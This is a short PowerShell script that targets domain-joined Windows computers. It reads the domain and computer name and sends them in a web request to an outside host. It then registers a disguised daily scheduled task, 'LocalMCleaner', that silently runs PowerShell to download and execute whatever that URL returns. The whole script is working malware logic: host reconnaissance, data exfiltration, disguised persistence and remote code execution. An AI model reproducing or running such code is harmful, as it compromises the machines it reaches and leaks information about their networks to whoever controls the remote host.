$computerInfo = Get-ComputerInfo  
if ($computerInfo.CsPartOfDomain) 
{ 
    $domain = $computerInfo.Domain  
    $computerName = $computerInfo.CsName  
    $domain = $computerInfo.CsDomain
    $fullString = $domain+"_"+$computerName 
    $url = "http://www.baidu.com/?q="+$fullString  
    try {  
        $response = Invoke-WebRequest -Uri $url -Method Get -UseBasicParsing  
        Write-Host "URL: $url"  
        Write-Host "$($response.StatusCode)"  
    } catch { 
    }  
    $ccc = '"Powershell -WindowStyle Hidden irm '  + $url +'|Powershell"'
    $str = "cmd.exe /c schtasks /create /sc daily /tn LocalMCleaner /tr " + $ccc +" /st 11:30 /f"
    iex  $str
} 
else
{  
    exit  
}
